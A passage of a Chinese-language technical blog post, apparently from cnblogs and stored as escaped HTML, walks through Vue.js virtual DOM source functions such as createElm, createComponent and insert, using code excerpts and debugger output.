  emptyNodeAt，createRmCb，removeNode，isUnknownElement，createElm，createComponent ，&lt;br/&gt;initComponent，reactivateComponent， insert， createChildren ,isPatchable ,setScope ,&lt;br/&gt;addVnodes ,invokeDestroyHook , removeVnodes , removeAndInvokeRemoveHook,updateChildren, &lt;br/&gt;checkDuplicateKeys, findIdxInOld , patchVnode , invokeInsertHook ,hydrate, assertNodeMatch
   核心函数return patch
}&lt;/span&gt;&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;&lt;span&gt;第一，要了解createPatchFunction的参数backend。backend的nodeOps是节点的功能函数，包括createElement创建元素、removeChild删除子元素，tagName获取到标签名等，backend的modules是vue框架用于分别执行某个渲染任务的功能函数。&lt;/span&gt;&lt;/p&gt;
&lt;p&gt;&lt;span&gt;&lt;img src=&quot;https://img2020.cnblogs.com/blog/1028445/202003/1028445-20200323174952266-1641188328.png&quot; alt=&quot;&quot;/&gt;&lt;/span&gt;&lt;/p&gt;


&lt;p&gt;&lt;span&gt; 根据详细的截图，可以看到每个模块完成某个功能，属性和类、监听器、DOM属性、样式的创建和更新、指令更新以及其他操作&lt;/span&gt;&lt;/p&gt;
&lt;p&gt;&lt;span&gt;&lt;img src=&quot;https://img2020.cnblogs.com/blog/1028445/202003/1028445-20200323175847642-2143418239.png&quot; alt=&quot;&quot;/&gt;&lt;/span&gt;&lt;/p&gt;
&lt;p&gt; 我们知道vue虚拟DOM的比较依赖于diff算法，diff算法到底有什么魔法能快速比较出文本的差异？我们可以手动的写一个简易的函数实现diff算法。具体可参照&lt;a title=&quot;一篇写的很好的diff算法文章&quot; href=&quot;https://www.cnblogs.com/MRRAOBX/articles/10043258.html&quot;&gt;https://www.cnblogs.com/MRRAOBX/articles/10043258.html&lt;/a&gt;。&lt;/p&gt;
&lt;p&gt;首先，我们先假设一个需求。&lt;/p&gt;
&lt;div class=&quot;cnblogs_code&quot; readability=&quot;35&quot;&gt;
&lt;pre&gt;
&amp;lt;div class = &quot;box&quot;&amp;gt;
    &amp;lt;ul&amp;gt;
        &amp;lt;li&amp;gt; hello,everyone!&amp;lt;/li&amp;gt;
    &amp;lt;/ul&amp;gt;
&amp;lt;/div&amp;gt;

&lt;span&gt;var&lt;/span&gt; list = document.querySelector( '.list'&lt;span&gt; )
&lt;/span&gt;&lt;span&gt;var&lt;/span&gt; li = document.createElement( 'LI'&lt;span&gt; )
li.innerHTML &lt;/span&gt;= ' 疫情还没有结束 '&lt;span&gt;

list.appendChild( li )&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;我们用一个vdom对象模拟上述html结构，并通过render函数渲染出来。然后 数据更改了，&lt;a href=&quot;http://data.name/&quot; rel=&quot;nofollow&quot;&gt;data.name&lt;/a&gt; = ‘疫情终于结束了’&lt;/p&gt;
&lt;div class=&quot;cnblogs_code&quot; readability=&quot;37&quot;&gt;
&lt;pre&gt;
&lt;span&gt;var&lt;/span&gt; vdom =&lt;span&gt; {
      tag: &lt;/span&gt;'div'&lt;span&gt;,
      attr: {
        className: &lt;/span&gt;'box'&lt;span&gt;
      },
      content: [
        {
          tag: &lt;/span&gt;'ul'&lt;span&gt;,
          content: [
            {
              tag: &lt;/span&gt;'li'&lt;span&gt;,
              content: data.name
           }
          ]
         }
      ]
    }&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;那么我们通过diff算法比对两次vdom,生成patch对象，最终实现了打补丁。&lt;/p&gt;
&lt;p&gt;&lt;span&gt; &lt;/span&gt;&lt;/p&gt;

&lt;p&gt;&lt;span&gt;VNode类定义了很多属性。&lt;/span&gt;&lt;/p&gt;
&lt;div class=&quot;cnblogs_code&quot; readability=&quot;33&quot;&gt;
&lt;pre&gt;
&lt;span&gt;export &lt;span&gt;default&lt;/span&gt;&lt;span&gt; class VNode {
  tag: string &lt;/span&gt;| &lt;span&gt;void&lt;/span&gt;&lt;span&gt;;
  data: VNodeData &lt;/span&gt;| &lt;span&gt;void&lt;/span&gt;&lt;span&gt;;
  &lt;/span&gt;&lt;span&gt;//&lt;/span&gt;&lt;span&gt; VNode类定义了属性tag&lt;/span&gt;
&lt;span&gt;   constructor (){}
  .......
}&lt;/span&gt;&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;&lt;span&gt;同时提供了提供了一些功能，createEmptyVNode创建空的VNode，createTextVNode创建文本类型的VNode，cloneVNode克隆VNode。&lt;/span&gt;&lt;/p&gt;
&lt;p&gt;&lt;span&gt;为了方便我们更好的理解这个属性，我们可以运行源码，打印一下这个Vnode。我们是不是可以看到最重要的属性就是tag(标签名)、data(标签的属性-值)、children(所有后代元素)、context(上下文对象)。&lt;/span&gt;&lt;/p&gt;
&lt;p&gt;&lt;span&gt;&lt;img src=&quot;https://img2020.cnblogs.com/blog/1028445/202003/1028445-20200323173750245-1693413431.png&quot; alt=&quot;&quot; width=&quot;882&quot; height=&quot;508&quot;/&gt;&lt;/span&gt;&lt;/p&gt;


&lt;p&gt;&lt;span&gt; 附我的html结构&lt;/span&gt;&lt;/p&gt;
&lt;div class=&quot;cnblogs_Highlighter&quot; readability=&quot;32&quot;&gt;
&lt;pre class=&quot;brush:html;gutter:true;&quot;&gt;
&lt;span&gt;&amp;lt;div id=&quot;app&quot;&amp;gt;
&amp;lt;div&amp;gt;&amp;lt;/div&amp;gt;
  。。。。。。
&amp;lt;/div&amp;gt;&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;

&lt;p&gt;&lt;span&gt;createPatch函数包括有关VNode增删改查的功能函数&lt;/span&gt;&lt;/p&gt;
&lt;div class=&quot;cnblogs_code&quot; readability=&quot;37&quot;&gt;
&lt;pre&gt;
&lt;span&gt;&lt;span&gt;//&lt;/span&gt;&lt;span&gt;返回的e&lt;/span&gt;
&lt;span&gt;function&lt;/span&gt;&lt;span&gt; emptyNodeAt (elm) {
    &lt;/span&gt;&lt;span&gt;return&lt;/span&gt; &lt;span&gt;new&lt;/span&gt;&lt;span&gt; VNode(nodeOps.tagName(elm).toLowerCase(), {}, [], undefined, elm)
  }
&lt;/span&gt;&lt;span&gt;//&lt;/span&gt;&lt;span&gt;使用它的地方只有一个&lt;/span&gt;
 oldVnode = emptyNodeAt(oldVnode);&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;
&lt;pre&gt;
&lt;span&gt;emptyNodeAt包装oldVnode前后有什么区别呢？依然是运行源码，我们发现传入的参数是dom元素，包装后变成了VNode，即vue形式的节点实例。&lt;/span&gt;
&lt;/pre&gt;
&lt;p&gt;&lt;img src=&quot;https://img2020.cnblogs.com/blog/1028445/202003/1028445-20200323183901728-1075139741.png&quot; alt=&quot;&quot;/&gt;&lt;/p&gt;


&lt;p&gt;&lt;span&gt; createRmCb功能是创建remove函数&lt;/span&gt;&lt;br/&gt;&lt;span&gt;remove$$1函数作为一个对象，第一个参数是vnode所属的dom元素，第二个参数是监听器个数。内部实现remove函数拥有listeners属性，等到这个属性的值每一次减少直到0时将直接移除节点。这个原理很简单，要移除某个节点，先要把监听器一个一个的全部移除掉。&lt;/span&gt;&lt;/p&gt;
&lt;div class=&quot;cnblogs_code&quot; readability=&quot;36&quot;&gt;
&lt;pre&gt;
&lt;span&gt;rm =&lt;span&gt; createRmCb(vnode.elm, listeners);
&lt;/span&gt;&lt;span&gt;//&lt;/span&gt;&lt;span&gt;只有一个地方使用了createRmCb&lt;/span&gt;
'&lt;span&gt;function createRmCb (childElm, listeners) {
      function remove$$1 () {
        if (--remove$$1.listeners === 0) {
          removeNode(childElm);
        }
      }
      remove$$1.listeners = listeners;
      return remove$$1
}&lt;/span&gt;&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;removeNode移除节点，先找到父节点，然后通过removeChild移除掉这个节点。那么为什么要这样操作呢？因为这里的removeChild是原生方法中移除的唯一做法。&lt;/p&gt;
&lt;div class=&quot;cnblogs_code&quot; readability=&quot;34&quot;&gt;
&lt;pre&gt;
&lt;span&gt;function&lt;/span&gt;&lt;span&gt; removeNode (el) {
    const parent &lt;/span&gt;=&lt;span&gt; nodeOps.parentNode(el)
    &lt;/span&gt;&lt;span&gt;//&lt;/span&gt;&lt;span&gt; element may have already been removed due to v-html / v-text&lt;/span&gt;
    &lt;span&gt;if&lt;/span&gt;&lt;span&gt; (isDef(parent)) {
      nodeOps.removeChild(parent, el)
    }
  }&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;
&lt;div class=&quot;cnblogs_code&quot; readability=&quot;33&quot;&gt;
&lt;pre&gt;
&lt;span&gt;function&lt;/span&gt;&lt;span&gt; removeChild (node, child) {
    node.removeChild(child);
  }&lt;/span&gt;&lt;span&gt;isUnknownElement略。&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;
&lt;pre&gt;
&lt;em&gt;&lt;span&gt;create***函数&lt;/span&gt;&lt;br/&gt;&lt;span&gt;createElm第&lt;/span&gt;&lt;/em&gt;&lt;span&gt;一个参数是vue node实例，在vnode.js文件中我们已经知道了vnode类的具体情况，第二个参数是数组，表示插入的vnode实例的队列，第三&lt;/span&gt;&lt;span&gt;个参数是parentElm父元素，毕竟原生的&lt;br/&gt;添加元素唯一的方法是先找到父元素，然后appendChild添加元素。第4个参数是refElm，如果子元素包含ref属性的节点，那么这个参数就有值。第5个参数是nested，值是true或者false.第5个&lt;br/&gt;参数是ownerArray，它是当前节点和兄弟节点组成的数组。第6个是index索引。&lt;/span&gt;
&lt;/pre&gt;
&lt;div class=&quot;cnblogs_code&quot; readability=&quot;38&quot;&gt;
&lt;pre&gt;
&lt;span&gt;&lt;span&gt;function&lt;/span&gt;&lt;span&gt; createElm (
      vnode,
      insertedVnodeQueue,
      parentElm,
      refElm,
      nested,
      ownerArray,
      index
    ) {&lt;/span&gt;&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;
&lt;div class=&quot;cnblogs_code&quot; readability=&quot;37&quot;&gt;
&lt;pre&gt;
 &lt;span&gt;if&lt;/span&gt; (isDef(vnode.elm) &amp;amp;&amp;amp;&lt;span&gt; isDef(ownerArray)) {
      &lt;/span&gt;&lt;span&gt;//&lt;/span&gt;&lt;span&gt; This vnode was used in a previous render!&lt;/span&gt;
      &lt;span&gt;//&lt;/span&gt;&lt;span&gt; now it's used as a new node, overwriting its elm would cause&lt;/span&gt;
      &lt;span&gt;//&lt;/span&gt;&lt;span&gt; potential patch errors down the road when it's used as an insertion&lt;/span&gt;
      &lt;span&gt;//&lt;/span&gt;&lt;span&gt; reference node. Instead, we clone the node on-demand before creating&lt;/span&gt;
      &lt;span&gt;//&lt;/span&gt;&lt;span&gt; associated DOM element for it.&lt;/span&gt;
      vnode = ownerArray[index] =&lt;span&gt; cloneVNode(vnode)
    }&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;&lt;span&gt;首先我们对某一种类型的vnode进行了调整。一般情况下vnode的elm都有定义，不过当我用vnode.elm打印时返回undefined(具体原因还不知道，明明打印出来的vnode的elm属性的呀)。另外，ownerArray有哪些元素不会定义呢，答案是vue项目挂载app的根元素。这样一来，普通的vnode都不会进入这个if语句。&lt;/span&gt;&lt;/p&gt;
&lt;div class=&quot;cnblogs_code&quot; readability=&quot;37&quot;&gt;
&lt;pre&gt;
&lt;span&gt;vnode.isRootInsert = !nested &lt;span&gt;//&lt;/span&gt;&lt;span&gt; for transition enter check&lt;/span&gt;&lt;span&gt;
//&lt;/span&gt;&lt;span&gt;根据注释，它跟vue画面的渐进效果有关&lt;/span&gt;
    &lt;span&gt;if&lt;/span&gt;&lt;span&gt; (createComponent(vnode, insertedVnodeQueue, parentElm, refElm)) {
      &lt;/span&gt;&lt;span&gt;return&lt;/span&gt;&lt;span&gt;
    }
&lt;/span&gt;&lt;span&gt;//&lt;/span&gt;&lt;span&gt;如果是创建组件，那么直接返回&lt;/span&gt;&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;具体看后面createComponent的功能咯。&lt;/p&gt;
&lt;div class=&quot;cnblogs_code&quot; readability=&quot;38&quot;&gt;
&lt;pre&gt;
&lt;span&gt;const data =&lt;span&gt; vnode.data
    const children &lt;/span&gt;=&lt;span&gt; vnode.children
    const tag &lt;/span&gt;=&lt;span&gt; vnode.tag
    &lt;/span&gt;&lt;span&gt;if&lt;/span&gt;&lt;span&gt; (isDef(tag)) {
      &lt;/span&gt;&lt;span&gt;if&lt;/span&gt; (process.env.NODE_ENV !== 'production'&lt;span&gt;) {
        &lt;/span&gt;&lt;span&gt;if&lt;/span&gt; (data &amp;amp;&amp;amp;&lt;span&gt; data.pre) {
          creatingElmInVPre&lt;/span&gt;++&lt;span&gt;
        }
        &lt;/span&gt;&lt;span&gt;if&lt;/span&gt;&lt;span&gt; (isUnknownElement(vnode, creatingElmInVPre)) {
          warn(
            &lt;/span&gt;'Unknown custom element: &amp;lt;' + tag + '&amp;gt; - did you ' +
            'register the component correctly? For recursive components, ' +
            'make sure to provide the &quot;name&quot; option.'&lt;span&gt;,
            vnode.context
          )
        }
      }&lt;/span&gt;&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;这一段就是把需要的数据从vnode中取出来，我们上面已经打印过vnode了，复习一下，data 是有关元素key-value的数据信息，chidren是后代元素，tag是标签名。并有针对开发环境的调试信息。&lt;/p&gt;
&lt;div class=&quot;cnblogs_code&quot; readability=&quot;35&quot;&gt;
&lt;pre&gt;
&lt;span&gt;vnode.elm =&lt;span&gt; vnode.ns
        &lt;/span&gt;?&lt;span&gt; nodeOps.createElementNS(vnode.ns, tag)
        : nodeOps.createElement(tag, vnode)
      setScope(vnode)
&lt;/span&gt;&lt;span&gt;//&lt;/span&gt;&lt;span&gt;namespce命名空间&lt;/span&gt;&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;接下来，weex直接略过。、&lt;/p&gt;
&lt;div class=&quot;cnblogs_code&quot; readability=&quot;38&quot;&gt;
&lt;pre&gt;
 &lt;span&gt;else&lt;/span&gt;&lt;span&gt; {
        createChildren(vnode, children, insertedVnodeQueue)
        &lt;/span&gt;&lt;span&gt;if&lt;/span&gt;&lt;span&gt; (isDef(data)) {
          invokeCreateHooks(vnode, insertedVnodeQueue)
        }
        insert(parentElm, vnode.elm, refElm)
      }&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;那么我们看到创建元素调用的核心函数是createChildren和insert。&lt;/p&gt;
&lt;div class=&quot;cnblogs_code&quot; readability=&quot;44&quot;&gt;
&lt;pre&gt;
&lt;span&gt;&lt;span&gt;function&lt;/span&gt;&lt;span&gt; createChildren (vnode, children, insertedVnodeQueue) {
&lt;/span&gt;&lt;span&gt;//&lt;/span&gt;&lt;span&gt;若&lt;/span&gt;
    &lt;span&gt;if&lt;/span&gt;&lt;span&gt; (Array.isArray(children)) {
      &lt;/span&gt;&lt;span&gt;if&lt;/span&gt; (process.env.NODE_ENV !== 'production'&lt;span&gt;) {
        checkDuplicateKeys(children)
      }
&lt;/span&gt;&lt;span&gt;//
&lt;/span&gt;      &lt;span&gt;for&lt;/span&gt; (let i = 0; i &amp;lt; children.length; ++&lt;span&gt;i) {
        createElm(children[i], insertedVnodeQueue, vnode.elm, &lt;/span&gt;&lt;span&gt;null&lt;/span&gt;, &lt;span&gt;true&lt;/span&gt;&lt;span&gt;, children, i)
      }
    } 
&lt;/span&gt;&lt;span&gt;//&lt;/span&gt;&lt;span&gt;如果是原生类型&lt;/span&gt;
&lt;span&gt;else&lt;/span&gt; &lt;span&gt;if&lt;/span&gt;&lt;span&gt; (isPrimitive(vnode.text)) {
      nodeOps.appendChild(vnode.elm, nodeOps.createTextNode(String(vnode.text)))
    }
  }&lt;/span&gt;&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;createChildren&lt;/p&gt;
&lt;div class=&quot;cnblogs_code&quot; readability=&quot;44&quot;&gt;
&lt;pre&gt;
&lt;span&gt;&lt;span&gt;function&lt;/span&gt;&lt;span&gt; insert (parent, elm, ref) {
    &lt;/span&gt;&lt;span&gt;if&lt;/span&gt;&lt;span&gt; (isDef(parent)) {
      &lt;/span&gt;&lt;span&gt;if&lt;/span&gt;&lt;span&gt; (isDef(ref)) {
        &lt;/span&gt;&lt;span&gt;if&lt;/span&gt; (nodeOps.parentNode(ref) ===&lt;span&gt; parent) {
          nodeOps.insertBefore(parent, elm, ref)
        }
      } &lt;/span&gt;&lt;span&gt;else&lt;/span&gt;&lt;span&gt; {
        nodeOps.appendChild(parent, elm)
      }
    }
  }
&lt;/span&gt;&lt;span&gt;function&lt;/span&gt;&lt;span&gt; appendChild (node, child) {
  node.appendChild(child);
}
&lt;/span&gt;&lt;span&gt;function&lt;/span&gt;&lt;span&gt; insertBefore (parentNode, newNode, referenceNode) {
  parentNode.insertBefore(newNode, referenceNode);
}&lt;/span&gt;&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;insert&lt;/p&gt;
&lt;div class=&quot;cnblogs_code&quot; readability=&quot;42&quot;&gt;
&lt;pre&gt;
&lt;span&gt;&lt;span&gt;function&lt;/span&gt;&lt;span&gt; insert (parent, elm, ref) {
    &lt;/span&gt;&lt;span&gt;if&lt;/span&gt;&lt;span&gt; (isDef(parent)) {
      &lt;/span&gt;&lt;span&gt;if&lt;/span&gt;&lt;span&gt; (isDef(ref)) {
       &lt;/span&gt;&lt;span&gt;//&lt;/span&gt;&lt;span&gt;若ref节点的父元素等于该元素的父元素&lt;/span&gt;
        &lt;span&gt;if&lt;/span&gt; (nodeOps.parentNode(ref) ===&lt;span&gt; parent) {
      &lt;/span&gt;&lt;span&gt;//&lt;/span&gt;&lt;span&gt;那么通过insertBefore方法将元素ref插入到elm之前&lt;/span&gt;
&lt;span&gt;          nodeOps.insertBefore(parent, elm, ref)
        }
      } &lt;/span&gt;&lt;span&gt;else&lt;/span&gt;&lt;span&gt; {
      &lt;/span&gt;&lt;span&gt;//&lt;/span&gt;&lt;span&gt;添加元素elm&lt;/span&gt;
&lt;span&gt;        nodeOps.appendChild(parent, elm)
      }
    }
}
&lt;/span&gt;&lt;span&gt;//&lt;/span&gt;&lt;span&gt;调用insert的例子&lt;/span&gt;
vnode.elm =&lt;span&gt; nodeOps.createComment(vnode.text)
insert(parentElm, vnode.elm, refElm)&lt;/span&gt;&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;
&lt;pre&gt;
到底vue是如何创建元素的？我们用简单的html结构看一下createElm到底是如何运行的(我通过源码打断点的方式来看到底发生了什么)
&lt;/pre&gt;
&lt;div class=&quot;cnblogs_code&quot; readability=&quot;33&quot;&gt;
&lt;pre&gt;
&lt;span&gt;&lt;span&gt;new&lt;/span&gt;&lt;span&gt; Vue({
        el:&lt;/span&gt;&quot;#app&quot;&lt;span&gt;,}
);
&lt;/span&gt;&lt;span&gt;//html结构&lt;/span&gt;
&amp;lt;div id=&quot;app&quot;&amp;gt;
        &amp;lt;span&amp;gt;123&amp;lt;/span&amp;gt;
&amp;lt;/div&amp;gt;&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;&lt;img src=&quot;https://img2020.cnblogs.com/blog/1028445/202003/1028445-20200325171541713-2068672214.png&quot; alt=&quot;&quot;/&gt;&lt;/p&gt;

&lt;p&gt;vue项目初始化时首先创建div#app的节点。vnode是div#app的vnode,insertedVnodeQueue为空数组，parentElm是body元素，refElm如图，refElm到底是什么？它是一个文本节点。&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://img2020.cnblogs.com/blog/1028445/202003/1028445-20200325174836068-515827979.png&quot; alt=&quot;&quot;/&gt;&lt;/p&gt;
&lt;div class=&quot;cnblogs_code&quot; readability=&quot;35&quot;&gt;
&lt;pre&gt;
wholeText: &quot;↵&quot;&lt;span&gt;
assignedSlot: &lt;/span&gt;&lt;span&gt;null&lt;/span&gt;&lt;span&gt;
data: &lt;/span&gt;&quot;↵&quot;&lt;span&gt;
length: &lt;/span&gt;1&lt;span&gt;
previousElementSibling: div#app
nextElementSibling: script
nodeType: &lt;/span&gt;3&lt;span&gt;
nodeName: &lt;/span&gt;&quot;#text&quot;&lt;span&gt;
baseURI: &lt;/span&gt;&quot;http://localhost:63342/vuesrc/1.vue.set%E4%BD%BF%E7%94%A8.html?_ijt=clboq4te5mp0i755tqhvsc3q75&quot;&lt;span&gt;
isConnected: &lt;/span&gt;&lt;span&gt;true&lt;/span&gt;&lt;span&gt;
ownerDocument: document
parentNode: body
parentElement: body
childNodes: NodeList []
firstChild: &lt;/span&gt;&lt;span&gt;null&lt;/span&gt;&lt;span&gt;
lastChild: &lt;/span&gt;&lt;span&gt;null&lt;/span&gt;&lt;span&gt;
previousSibling: div#app
nextSibling: script
nodeValue: &lt;/span&gt;&quot;↵&quot;&lt;span&gt;
textContent: &lt;/span&gt;&quot;↵&quot;&lt;span&gt;
__proto__: Text&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;第二个创建的元素是span。span的refElm是null,nested为true。&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://img2020.cnblogs.com/blog/1028445/202003/1028445-20200325175338051-2117696669.png&quot; alt=&quot;&quot;/&gt;&lt;/p&gt;

&lt;p&gt; 第三个创建的是123所代表的文本节点。&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://img2020.cnblogs.com/blog/1028445/202003/1028445-20200325175831623-590203228.png&quot; alt=&quot;&quot;/&gt;&lt;/p&gt;

&lt;p&gt; 我们看到当vue项目要加载某些节点时都会调用它。&lt;/p&gt;
&lt;pre&gt;
&lt;span&gt;createComponent的使用在createElm这一行有这个判断。&lt;/span&gt;
&lt;/pre&gt;
&lt;div class=&quot;cnblogs_code&quot; readability=&quot;35&quot;&gt;
&lt;pre&gt;
&lt;span&gt; &lt;span&gt;if&lt;/span&gt;&lt;span&gt; (createComponent(vnode, insertedVnodeQueue, parentElm, refElm)) {
      &lt;/span&gt;&lt;span&gt;return&lt;/span&gt;&lt;span&gt;
    }&lt;/span&gt;&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;
&lt;div class=&quot;cnblogs_code&quot; readability=&quot;46&quot;&gt;
&lt;pre&gt;
 &lt;span&gt;function&lt;/span&gt;&lt;span&gt; createComponent (vnode, insertedVnodeQueue, parentElm, refElm) {
      &lt;/span&gt;&lt;span&gt;var&lt;/span&gt; i =&lt;span&gt; vnode.data;
      &lt;/span&gt;&lt;span&gt;if&lt;/span&gt;&lt;span&gt; (isDef(i)) {
        &lt;/span&gt;&lt;span&gt;var&lt;/span&gt; isReactivated = isDef(vnode.componentInstance) &amp;amp;&amp;amp;&lt;span&gt; i.keepAlive;
        &lt;/span&gt;&lt;span&gt;if&lt;/span&gt; (isDef(i = i.hook) &amp;amp;&amp;amp; isDef(i =&lt;span&gt; i.init)) {
          i(vnode, &lt;/span&gt;&lt;span&gt;false&lt;/span&gt; &lt;span&gt;/*&lt;/span&gt;&lt;span&gt; hydrating &lt;/span&gt;&lt;span&gt;*/&lt;/span&gt;&lt;span&gt;);
        }
        &lt;/span&gt;&lt;span&gt;//&lt;/span&gt;&lt;span&gt; after calling the init hook, if the vnode is a child component&lt;/span&gt;
        &lt;span&gt;//&lt;/span&gt;&lt;span&gt; it should've created a child instance and mounted it. the child&lt;/span&gt;
        &lt;span&gt;//&lt;/span&gt;&lt;span&gt; component also has set the placeholder vnode's elm.&lt;/span&gt;
        &lt;span&gt;//&lt;/span&gt;&lt;span&gt; in that case we can just return the element and be done.&lt;/span&gt;
        &lt;span&gt;if&lt;/span&gt;&lt;span&gt; (isDef(vnode.componentInstance)) {
          initComponent(vnode, insertedVnodeQueue);
          insert(parentElm, vnode.elm, refElm);
          &lt;/span&gt;&lt;span&gt;if&lt;/span&gt;&lt;span&gt; (isTrue(isReactivated)) {
            reactivateComponent(vnode, insertedVnodeQueue, parentElm, refElm);
          }
          &lt;/span&gt;&lt;span&gt;return&lt;/span&gt; &lt;span&gt;true&lt;/span&gt;&lt;span&gt;
        }
      }
    }&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;
&lt;pre&gt;
&lt;span&gt;首先是div#app元素。&lt;br/&gt;在createComponent中判断vnode.data。div#app判断isDef(i)为true。&lt;/span&gt;
&lt;/pre&gt;
&lt;pre&gt;
&lt;span&gt;var isReactivated = isDef(vnode.componentInstance) &amp;amp;&amp;amp; i.keepAlive;&lt;/span&gt;
&lt;/pre&gt;
&lt;p&gt;&lt;img src=&quot;https://img2020.cnblogs.com/blog/1028445/202003/1028445-20200325181725969-960854163.png&quot; alt=&quot;&quot;/&gt;&lt;/p&gt;

&lt;p&gt;isReactivated和判断hook和init的if都会返回false。第二个if由于&lt;span class=&quot;name&quot;&gt;componentInstance: &lt;span class=&quot;object-value-undefined value&quot;&gt;undefined也会false。&lt;/span&gt;&lt;/span&gt;&lt;/p&gt;
&lt;div class=&quot;cnblogs_code&quot; readability=&quot;33&quot;&gt;
&lt;pre&gt;
 &lt;span&gt;var&lt;/span&gt; isReactivated = isDef(vnode.componentInstance) &amp;amp;&amp;amp;&lt;span&gt; i.keepAlive;
        &lt;/span&gt;&lt;span&gt;if&lt;/span&gt; (isDef(i = i.hook) &amp;amp;&amp;amp; isDef(i = i.init)) {
&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;第二是span以及文本节点，他们由于data未定义，所以并不会进入外层if语句。&lt;/p&gt;
&lt;p&gt;isPatchable&lt;/p&gt;
&lt;div class=&quot;cnblogs_code&quot; readability=&quot;33&quot;&gt;
&lt;pre&gt;
&lt;span&gt;function&lt;/span&gt;&lt;span&gt; isPatchable (vnode) {
    &lt;/span&gt;&lt;span&gt;while&lt;/span&gt;&lt;span&gt; (vnode.componentInstance) {
      vnode &lt;/span&gt;=&lt;span&gt; vnode.componentInstance._vnode
    }
    &lt;/span&gt;&lt;span&gt;return&lt;/span&gt;&lt;span&gt; isDef(vnode.tag)
  }&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;invokeCreateHooks&lt;/p&gt;
&lt;p&gt;div#app的创建时会调用invokeCreateHooks&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://img2020.cnblogs.com/blog/1028445/202003/1028445-20200326124906245-2145808918.png&quot; alt=&quot;&quot;/&gt;&lt;/p&gt;


&lt;p&gt; cbs的内容是&lt;/p&gt;
&lt;div class=&quot;cnblogs_code&quot; readability=&quot;57&quot;&gt;
&lt;pre&gt;
create: (8&lt;span&gt;) [ƒ, ƒ, ƒ, ƒ, ƒ, ƒ, ƒ, ƒ]
activate: [ƒ]
update: (&lt;/span&gt;7&lt;span&gt;) [ƒ, ƒ, ƒ, ƒ, ƒ, ƒ, ƒ]
remove: [ƒ]
destroy: (&lt;/span&gt;2&lt;span&gt;) [ƒ, ƒ]
__proto__: Object&lt;br/&gt;。。。。&lt;/span&gt;&lt;span class=&quot;name-and-value&quot;&gt;&lt;span class=&quot;name&quot;&gt;create: &lt;span class=&quot;value object-value-array&quot;&gt;Array(8)&lt;br/&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&quot;name-and-value&quot;&gt;&lt;span class=&quot;name&quot;&gt;0: &lt;span class=&quot;object-value-function value&quot;&gt;&lt;span class=&quot;object-value-function-prefix&quot;&gt;ƒ updateAttrs(oldVnode, vnode)&lt;br/&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&quot;name-and-value&quot;&gt;&lt;span class=&quot;name&quot;&gt;1: &lt;span class=&quot;object-value-function value&quot;&gt;&lt;span class=&quot;object-value-function-prefix&quot;&gt;ƒ updateClass(oldVnode, vnode)&lt;br/&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&quot;name-and-value&quot;&gt;&lt;span class=&quot;name&quot;&gt;2: &lt;span class=&quot;object-value-function value&quot;&gt;&lt;span class=&quot;object-value-function-prefix&quot;&gt;ƒ updateDOMListeners(oldVnode, vnode)&lt;br/&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&quot;name-and-value&quot;&gt;&lt;span class=&quot;name&quot;&gt;3: &lt;span class=&quot;object-value-function value&quot;&gt;&lt;span class=&quot;object-value-function-prefix&quot;&gt;ƒ updateDOMProps(oldVnode, vnode)&lt;br/&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&quot;name-and-value&quot;&gt;&lt;span class=&quot;name&quot;&gt;4: &lt;span class=&quot;object-value-function value&quot;&gt;&lt;span class=&quot;object-value-function-prefix&quot;&gt;ƒ updateStyle(oldVnode, vnode)&lt;br/&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&quot;name-and-value&quot;&gt;&lt;span class=&quot;name&quot;&gt;5: &lt;span class=&quot;object-value-function value&quot;&gt;&lt;span class=&quot;object-value-function-prefix&quot;&gt;ƒ _enter(_, vnode)&lt;br/&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&quot;name-and-value&quot;&gt;&lt;span class=&quot;name&quot;&gt;6: &lt;span class=&quot;object-value-function value&quot;&gt;&lt;span class=&quot;object-value-function-prefix&quot;&gt;ƒ create(_, vnode)&lt;br/&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&quot;name-and-value&quot;&gt;&lt;span class=&quot;name&quot;&gt;7: &lt;span class=&quot;object-value-function value&quot;&gt;&lt;span class=&quot;object-value-function-prefix&quot;&gt;ƒ 